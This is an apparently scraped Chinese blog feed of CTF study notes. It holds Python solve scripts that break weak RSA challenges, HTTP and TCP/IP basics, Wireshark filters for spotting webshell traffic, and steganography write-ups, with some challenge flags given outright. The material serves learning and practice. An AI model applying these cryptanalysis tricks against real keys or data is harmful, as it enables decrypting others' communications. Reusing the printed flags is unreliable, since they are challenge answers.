        <content type="html"><![CDATA[<blockquote><p>不记录直接可以套脚本写出来的</p></blockquote><h2 id="风二西RSA-1"><a href="#风二西RSA-1" class="headerlink" title="风二西RSA_1"></a>风二西RSA_1</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs stylus">import gmpy2<br>import libnum<br>import uuid<br>flag=<span class="hljs-string">&quot;flag&#123;&quot;</span>+str(uuid<span class="hljs-selector-class">.uuid4</span>())+<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(flag)</span></span><br>m=libnum<span class="hljs-selector-class">.s2n</span>(flag)<br>p=libnum<span class="hljs-selector-class">.generate_prime</span>(<span class="hljs-number">512</span>)<br>q=libnum<span class="hljs-selector-class">.generate_prime</span>(<span class="hljs-number">512</span>)<br>n=p*<span class="hljs-selector-tag">q</span><br>e=<span class="hljs-number">1</span><br>c=pow(m,e,n)<br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;n=&quot;</span>,n)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;c=&quot;</span>,c)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;e=&quot;</span>,e)</span></span><br>n= 已给出太长我省略了<br>c= 已给出太长我省略了<br><br></code></pre></td></tr></table></figure><p>直接print(long_to_bytes(c))即可<br>因为long_to_bytes之后前面会多出<font color=red>‘b</font>，就像下面这样</p>    <figure class="figure-image">      <img src="/picture/c4.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> Crypto.Util.number import *<br><span class="hljs-attribute">e</span>=1<br>n =<br>c =<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(10000000000000000):<br>    <span class="hljs-attribute">x</span>=str(long_to_bytes(c+n*i))<br>    <span class="hljs-keyword">if</span> x[2]==<span class="hljs-string">&#x27;f&#x27;</span>:<br>        <span class="hljs-builtin-name">print</span>(x)<br>        break<br>    <br></code></pre></td></tr></table></figure><hr><h2 id="风二西RSA-2"><a href="#风二西RSA-2" class="headerlink" title="风二西RSA_2"></a>风二西RSA_2</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> gmpy<span class="hljs-number">2</span><br><span class="hljs-attribute">import</span> libnum<br><span class="hljs-attribute">import</span> uuid<br><span class="hljs-attribute">flag</span>=<span class="hljs-string">&quot;flag&#123;&quot;</span>+str(uuid.uuid<span class="hljs-number">4</span>())+<span class="hljs-string">&quot;&#125;&quot;</span><br><span class="hljs-attribute">print</span>(flag)<br><span class="hljs-attribute">m</span>=libnum.s<span class="hljs-number">2</span>n(flag)<br><span class="hljs-attribute">p1</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">q1</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">p2</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">q2</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">p3</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">q3</span>=libnum.generate_prime(<span class="hljs-number">64</span>)<br><span class="hljs-attribute">e</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">c1</span>=pow(m,e,p<span class="hljs-number">1</span>*q<span class="hljs-number">1</span>)<br><span class="hljs-attribute">c2</span>=pow(m,e,p<span class="hljs-number">2</span>*q<span class="hljs-number">2</span>)<br><span class="hljs-attribute">c3</span>=pow(m,e,p<span class="hljs-number">3</span>*q<span class="hljs-number">3</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n1=&quot;</span>,p<span class="hljs-number">1</span>*q<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;c1=&quot;</span>,c<span class="hljs-number">1</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n2=&quot;</span>,p<span class="hljs-number">2</span>*q<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;c2=&quot;</span>,c<span class="hljs-number">2</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;n3=&quot;</span>,p<span class="hljs-number">3</span>*q<span class="hljs-number">3</span>)<br><span class="hljs-attribute">print</span>(<span class="hljs-string">&quot;c3=&quot;</span>,c<span class="hljs-number">3</span>)<br><span class="hljs-attribute">n1</span>= <span class="hljs-number">172774622114813683746188230007837413819</span><br><span class="hljs-attribute">c1</span>= <span class="hljs-number">170260248491697016437095929037490480036</span><br><span class="hljs-attribute">n2</span>= <span class="hljs-number">160333927436069409658483084503168246581</span><br><span class="hljs-attribute">c2</span>= <span class="hljs-number">45134242975344810542214361639231372051</span><br><span class="hljs-attribute">n3</span>= <span class="hljs-number">170109598387116572557100744899522621873</span><br><span class="hljs-attribute">c3</span>= <span class="hljs-number">47903985600747367026642413789127948969</span><br><br></code></pre></td></tr></table></figure><p>m=c1 % n1<br>m=c2 % n2<br>m=c3 % n3<br>又n1、n2、n3两两互素，中国剩余定理（不知道有没有可以直接计算中国剩余定理的函数，我没有找到）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>n1 = <span class="hljs-number">172774622114813683746188230007837413819</span><br>c1 = <span class="hljs-number">170260248491697016437095929037490480036</span><br>n2 = <span class="hljs-number">160333927436069409658483084503168246581</span><br>c2 = <span class="hljs-number">45134242975344810542214361639231372051</span><br>n3 = <span class="hljs-number">170109598387116572557100744899522621873</span><br>c3 = <span class="hljs-number">47903985600747367026642413789127948969</span><br><span class="hljs-built_in">print</span>(gcd(n1,n2),gcd(n1,n3),gcd(n2,n3))<br>M1=n2*n3<br>M11=invert(M1,n1)<br>M2=n1*n3<br>M21=invert(M2,n2)<br>M3=n1*n2<br>M31=invert(M3,n3)<br>m=(c1*M1*M11+c2*M2*M21+c3*M3*M31)%(n1*n2*n3)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><hr><h2 id="风二西RSA-4-密钥读取"><a href="#风二西RSA-4-密钥读取" class="headerlink" title="风二西RSA_4 (密钥读取)"></a>风二西RSA_4 (密钥读取)</h2><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs processing">from Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;Pubckey.pem&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) as f:  #这个公钥打开之后发现其实是密钥<br>    <span class="hljs-built_in">key</span>=RSA.import_key(f.read())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=%d&#x27;</span> % <span class="hljs-built_in">key</span>.n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e=%d&#x27;</span> % <span class="hljs-built_in">key</span>.e)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;d=%d&#x27;</span> % <span class="hljs-built_in">key</span>.d)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;p=%d&#x27;</span> % <span class="hljs-built_in">key</span>.p)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;q=%d&#x27;</span> % <span class="hljs-built_in">key</span>.q)<br>    <br>with <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.pem&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) as f1:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>+<span class="hljs-built_in">str</span>(libnum.s2n(f1.read())))<br>n=<br>e=<span class="hljs-number">65537</span><br>d=<br>p=<br>q=<br>c=<br>m=<span class="hljs-built_in">pow</span>(c,d,n)  #注意这个m不是<span class="hljs-built_in">int</span>型的！！<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br><br></code></pre></td></tr></table></figure><hr><h2 id="RSA5"><a href="#RSA5" class="headerlink" title="RSA5"></a>RSA5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;pubckey1.pem&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:  <br>    key=RSA.import_key(f.read())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;n=%d&#x27;</span> % key.n)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;e=%d&#x27;</span> % key.e)<br>    <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag1.pem&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;c=&#x27;</span>+<span class="hljs-built_in">str</span>(libnum.s2n(f1.read())))<br><br>n=<br>e=<span class="hljs-number">65537</span><br>c=<br><br><span class="hljs-comment">#n分解</span><br>p =<br>q =<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e,phi)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(m)))<br></code></pre></td></tr></table></figure><hr><h2 id="RSA8"><a href="#RSA8" class="headerlink" title="RSA8"></a>RSA8</h2><p>给出n、e、c，但n是素数<br>phi=(n-1)     #这点我没有想到😜</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-built_in">import</span> gmpy2<br><span class="hljs-built_in">import</span> libnum<br><span class="hljs-attr">n=</span> <span class="hljs-number">161670795418661108941395547760068053355832555077779027853700140442876298077926786030806243269042521234383793929910836023913994987010924339006536693866763078849189869497871752489277315727669547511079303136326388638480680630822677173084810848784554433394382029956739707395702556105138001868786944077871569844771</span><br><span class="hljs-attr">c=</span> <span class="hljs-number">91652340468387584012845155237237896957786753396661434559421169499111938419733760364914054180181470453332534789456757372866493406817246725731113863637159054175158914882334950110118713886213759125279941357012004180349611604118066085014934218543579248275421019690815403585470855502464076600672369539603525850924</span><br><span class="hljs-attr">e=</span> <span class="hljs-number">65537</span><br><span class="hljs-attr">phi=n-1</span><br><span class="hljs-attr">d=gmpy2.invert(e,phi)</span><br><span class="hljs-attr">m=pow(c,d,n)</span><br>print(libnum.n2s(int(m)).decode())<br></code></pre></td></tr></table></figure><hr>]]></content>
      
      
      
        <tags>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http请求和响应、TCP网络五层架构等基础知识</title>
      <link href="/2022/01/14/http%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94/"/>
      <url>/2022/01/14/http%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h2 id="HTTP基础知识"><a href="#HTTP基础知识" class="headerlink" title="HTTP基础知识"></a>HTTP基础知识</h2><p>http协议的特点:<br>基于tcp/ip协议<br>默认端口号为80<br>请求与响应一一对应<br>每次请求相互独立，是无状态协议(这也是为什么需要cookie)</p><p>HTTP常用有八种请求方式，常用get和post<br>get请求：请求参数在url地址中，url有长度限制；<font color=red>get方式只能传输字符型的数据</font><br>post请求：请求参数在请求体中，无大小限制；<font color=red>post方式能传输字符和字节型数据</font>(当你想要上传一张图片或音乐必须使用post方式)</p><p>GET产生一个数据包，POST产生两个数据包。对于GET请求，浏览器会把http header和data一并发出去，服务器相应200（返回数据）。而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok。</p><img class="url&#x3D;&#x2F;picture&#x2F;web15.png"><p>响应状态码：服务器告诉浏览器本次请求和响应的状态<br>1×× ：服务器接收浏览器消息未完成，发送1××状态码<br>2×× ：成功，200<br>3×× ：重定向，302，,304<br>4×× ：客户端错误，404(没有找到对应资源)，405(请求方法不被允许)<br>5×× ：服务器错误，500(服务器内部出现异常)</p><img class="url&#x3D;&#x2F;picture&#x2F;web11.png"><img class="url&#x3D;&#x2F;picture&#x2F;web12.png"><img class="url&#x3D;&#x2F;picture&#x2F;web13.png"><img class="url&#x3D;&#x2F;picture&#x2F;web14.png"><h2 id="TCP网络五层架构"><a href="#TCP网络五层架构" class="headerlink" title="TCP网络五层架构"></a>TCP网络五层架构</h2><img class="url&#x3D;&#x2F;picture&#x2F;web2.png"><p>分层好处：<br>1、各层独立：限制了依赖关系的范围，各层之间使用标准化的接口，各层不需要知道上下层是如何工作的，增加或者修改一个应用层协议不会影响传输层协议<br>2、灵活性更好：比如路由器不需要应用层和传输层，分层后路由器就可以只用加载更少的几个协议层<br>3、易于测试和维护：提高了可测试性，可以独立的测试特定层，某一层有了更好的实现可以整体替换掉<br>4、能促进标准化：每一层之策清楚，方便标准化</p><h2 id="网络相关协议基础知识"><a href="#网络相关协议基础知识" class="headerlink" title="网络相关协议基础知识"></a>网络相关协议基础知识</h2><p>1、TCP/IP是互联网相关的各类协议族的总称：IEEE 802.3、TCP、UDP、HTTP、DNS、FTP、IP、FDDI、ICMP、SNMP、PPPoE</p><p>2、FTP(文件传输协议)、DNS(域名系统)、HTTP位于应用层</p><p>3、在传输层有两个不同性质的协议:TCP(传输控制协议)和UDP(用户数据报协议)</p><p>4、IP网际协议位于网络层，几乎所有使用网络的系统都会用到IP协议。可能有人会把“IP”和“IP地址”弄混，“IP”其实是一种协议的名称。IP协议的作用是把各种数据包传送给对方。而要确保确实送达到对方那里，则需要满足各类条件，其中两个重要的条件是IP地址和MAC地址。</p><p>IP地址是指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，MAC地址基本上不会更改。（一般电脑厂商可根据今年印了多少MAC地址，判断今年生产了多少台电脑）。</p><p>IP地址间的通信依赖MAC地址。在网络上，通信双方在同一局域网(LAN)下情况很少，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时会采用ARP协议。ARP协议是一种用于解析地址的协议，根据通信方的IP地址就可以查出对应的MAC地址</p><img class="url&#x3D;&#x2F;picture&#x2F;http1.jpg"><p>5、TCP位于传输层，提供可靠的字节流服务。字节流服务是指为了方便传输，将大块数据分割成以报文段为单位的数据包进行管理。TCP为了更容易传送大数据才把数据分割，而且<font color=red>TCP协议能够确认数据最终是否送达对方</font></p><p>为了准确无误的将数据送达目标处，TCP协议采用了<font color=red>三次握手策略</font>。用TCP协议把数据包发送出去后，TCP不会对传送后的情况置之不理，他一定会向对方确认是否成功送达。握手过程使用了TCP的标志——SYN(synchronize)和ACK(acknowledgement)。发送端首先发送一个带SYN标志的数据包给对方，接收端接收 后，回传一个带有SYN/ACK标志的数据包以表示传达确认信息。最后，发送端再回传一次带有ACK标志的数据包，代表“握手”结束</p><p>若握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包。</p><img class="url&#x3D;&#x2F;picture&#x2F;http2.jpg"><p>6、DNS位于应用层，它提供域名到IP地址之间的解析服务。计算机既可以被赋予IP地址也可以被赋予主机名和域名。比如：<a href="http://www.hackr.jp/">www.hackr.jp</a></p><p>用户通常使用主机名或域名来访问对方的计算机，而不是直接通过IP地址访问。因为与IP地址的一组纯数字相比，用字母配合数字的表示形式更符合人类记忆习惯。但计算机更擅长处理一长串数字，所以DNS协议就是提供了通过域名查询IP地址，或逆向从IP地址反查域名的协议</p><img class="url&#x3D;&#x2F;picture&#x2F;http3.jpg"><p>7、整个流程如图</p><img class="url&#x3D;&#x2F;picture&#x2F;http4.jpg"><blockquote><p>我是跟着《图解HTTP》和<a href="https://www.bilibili.com/video/BV1TR4y1x7zg?spm_id_from=333.999.0.0">这个视频(这是个超链接)</a>学习的这部分知识，我觉得我记录的每个知识点都是比较重要的知识点</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界流量分析题</title>
      <link href="/2022/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98/"/>
      <url>/2022/01/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<div class="aplayer-box" data-url='/picture/赵英俊 - 送你一朵小红花.mp3' data-name='送你一朵小红花' data-artist='赵英俊' data-cover='/picture/flower.png' ></div><h2 id="1、功夫再高也怕菜刀"><a href="#1、功夫再高也怕菜刀" class="headerlink" title="1、功夫再高也怕菜刀"></a>1、功夫再高也怕菜刀</h2>    <figure class="figure-image">      <img src="/picture/misc31.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc32.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>开始追踪流</p>    <figure class="figure-image">      <img src="/picture/misc33.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>flag.txt找了半天没找到到底要怎么才能获取<br>直接导出http对象</p>    <figure class="figure-image">      <img src="/picture/misc34.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>1(22).php很大，打开看一下</p>    <figure class="figure-image">      <img src="/picture/misc35.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc36.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>看到了这个png的文件头，把从文件头开始到文件末尾复制到一个新的txt文本，导入到010editor中，再导出为png</p>    <figure class="figure-image">      <img src="/picture/misc37.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>我以为这就是flag了，没想到不是，看别人的wp，知道pacp下面还有一个压缩包<br><font color=red>用binwalk分离不行，会得到很多东西，必须使用foremost分离</font>，得到一个压缩包，密码就是刚才得到的图片，得到flag</p><h2 id="2、wireshark-1"><a href="#2、wireshark-1" class="headerlink" title="2、wireshark-1"></a>2、wireshark-1</h2>    <figure class="figure-image">      <img src="/picture/misc38.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>导出HTTP对象</p>    <figure class="figure-image">      <img src="/picture/misc39.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>题目提示管理员登录网站的密码，所以看后三个和登录有关的文件。我先看了两个较大一点的，都是网站登录页面的html文件，打开第三个，passwd就直接写在里面了</p><h2 id="3、easycap"><a href="#3、easycap" class="headerlink" title="3、easycap"></a>3、easycap</h2>    <figure class="figure-image">      <img src="/picture/misc40.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>打开，追踪流得到FLAG<br>flag是FLAG:385b87afc8671dee07550290d16a8071</p><h1 id="功防世界就在其中反复观看！！！！"><a href="#功防世界就在其中反复观看！！！！" class="headerlink" title="功防世界就在其中反复观看！！！！"></a>功防世界就在其中反复观看！！！！</h1>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>misc流量包文件分析</title>
      <link href="/2022/01/13/misc%E6%B5%81%E9%87%8F%E5%8C%85%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2022/01/13/misc%E6%B5%81%E9%87%8F%E5%8C%85%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<div class="aplayer-box" data-url='/picture/赵英俊 - 送你一朵小红花.mp3' data-name='送你一朵小红花' data-artist='赵英俊' data-cover='/picture/flower.png' ></div><h2 id="wireshark过滤器"><a href="#wireshark过滤器" class="headerlink" title="wireshark过滤器"></a>wireshark过滤器</h2><p>1、过滤IP<br>ip.src eq x.x.x.x or ip.dst eq x.x.x.x   或者  ip.addr   eq  x.x.x.x</p><p>2、过滤端口<br>tcp.port eq 80 or udp.port eq 80<br>tcp.dstport == 80  只显tcp协议的目标端口为80<br>tcp.scrport == 80   只显tcp协议的源端口为80<br>tcp.port &gt;=1 and tcp.port&lt;=80   </p><p>3、<font color=red>过滤协议</font><br>tcp/udp/arp/icmp/http/ftp/dns/ip……</p><p>4、包长度过滤<br>一般长度较小的包，可能不会藏太多东西<br>udp.length == 26<br>tcp.len &gt;= 7<br>ip.len == 94<br>frame.len == 119  整个数据包的长度，从eth开始到最后</p><p>5、过滤MAC<br>eth.dst == A0:00:00:04:C5:84 过滤目标mac</p><p>6、<font color=red>http模式过滤</font><br>http.request.method == “GET”<br>http.request.method == “POST”<br>http.request.uri == “/img/logo-edu.gif”<br>http contains “GET”<br>http contains “HTTP/1.”<br>http.request.method == “GET”  &amp;&amp; http contains “User-Agent:”<br><font color=red>http contains “flag”</font><br>http contains “key”<br>tcp contains “flag”<br><font color=red>tcp contains “command”</font><br><font color=red>tcp contains “ls”</font></p><hr><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>1、协议分级<br>[统计]-&gt;[协议分级]</p>    <figure class="figure-image">      <img src="/picture/misc26.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>从协议分级可以看出这个pcap文件里的UDP明显多于TCP，所以就主要分析这个文件的UDP</p><p>2、根据数据包特征进行筛选<br>比如查看数据包时，有的数据包有某些特征，比如有http(80)，就可以筛选这种特征出来<br>[右键]-&gt;[作为过滤器应用]-&gt;[选中]</p>    <figure class="figure-image">      <img src="/picture/misc27.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>3、流汇聚<br>在关注的http数据包或tcp数据包中选择流汇聚，可以将HTTP流或TCP流汇聚或还原成数据，在弹出的框中可以看到数据内容</p>    <figure class="figure-image">      <img src="/picture/misc28.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc20.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>常见的HTTP流关键内容:<br>1、HTML中直接包含重要信息<br>2、上传或下载文件内容，通常包含文件名、hash值等关键信息<br>3、一句话木马、POST请求、内容包含eval、内容使用base64加密</p><p><font color=red>4、提取通过http传输的文件内容</font><br>[文件]-&gt;[导出对象]-&gt;[HTTP]</p>    <figure class="figure-image">      <img src="/picture/misc29.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>5、手动提取文件内容<br>点击想要的数据包，选中media type位置(或其他位置)<br>[右键]-&gt;[导出分组字节流]<br>在弹出的框中将文件保存成二进制文件</p><hr><h2 id="无线流量包和USB流量包之类的"><a href="#无线流量包和USB流量包之类的" class="headerlink" title="无线流量包和USB流量包之类的"></a>无线流量包和USB流量包之类的</h2>    <figure class="figure-image">      <img src="/picture/misc45.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc46.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>      <figure class="figure-image">      <img src="/picture/misc47.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  ]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界图片隐写题</title>
      <link href="/2022/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%A2%98/"/>
      <url>/2022/01/11/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="1、a-good-idea"><a href="#1、a-good-idea" class="headerlink" title="1、a_good_idea"></a>1、a_good_idea</h2><p>先010editor看，右栏Ascii很容易就看到很多misc，to_do.png之类的，binwalk分离得到压缩包，两张一模一样的图片和一个提示文档对像素进行操作。stegsolve里面，进行combine但是什么都看不出来，两个图片互换位置也都试过了。然后上网看了别人的wp之后才知道XOR之后，把曝光调到最后，得到一张二维码。这个想法，所以我想记录一下。</p>    <figure class="figure-image">      <img src="/picture/misc16.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>[图像]-&gt;[调整]-&gt;[曝光度]</p><h2 id="2、Training-Stegano-1"><a href="#2、Training-Stegano-1" class="headerlink" title="2、Training-Stegano-1"></a>2、Training-Stegano-1</h2><p>拿到图片，丢入010editor</p>    <figure class="figure-image">      <img src="/picture/misc17.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>大道至简，这题的flag就是steganoI，不需要套flag{}，记录这题想告诉我自己不要想太多吧，这题已经说了passwd:  了</p><h2 id="3、pure-color"><a href="#3、pure-color" class="headerlink" title="3、pure_color"></a>3、pure_color</h2><p>首先题目名字color有关，拿到图片是一张纯白得图片，很容易想到LSB</p>    <figure class="figure-image">      <img src="/picture/misc18.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>但是图片看起来只有半截，先爆破了一下宽高，发现没有问题，在试试LSB</p>    <figure class="figure-image">      <img src="/picture/misc19.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>什么也没有只拿到了Adobe ImageReady，猜测和ps有关，搜了一下</p>    <figure class="figure-image">      <img src="/picture/misc20.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>打开PS<br>[图像]-&gt;[自动色调]<br>即可得到flag</p>    <figure class="figure-image">      <img src="/picture/misc21.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <h2 id="4、stage1"><a href="#4、stage1" class="headerlink" title="4、stage1"></a>4、stage1</h2><p>丢进stegsolve里，很容易就发现二维码</p>    <figure class="figure-image">      <img src="/picture/misc41.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>但是实在Random colour map通道里的，能不能出现，全看运气，我弄了好久才出现一两次，每次你往左一次，再往右，出现的图片颜色不一样了。</p>    <figure class="figure-image">      <img src="/picture/misc42.png" alt="" loading="lazy" />      <figcaption></figcaption>    </figure>  <p>十六进制转文件</p>    <figure class="figure-image">      <img src="/picture/misc43.png" alt="" loading="lazy" />      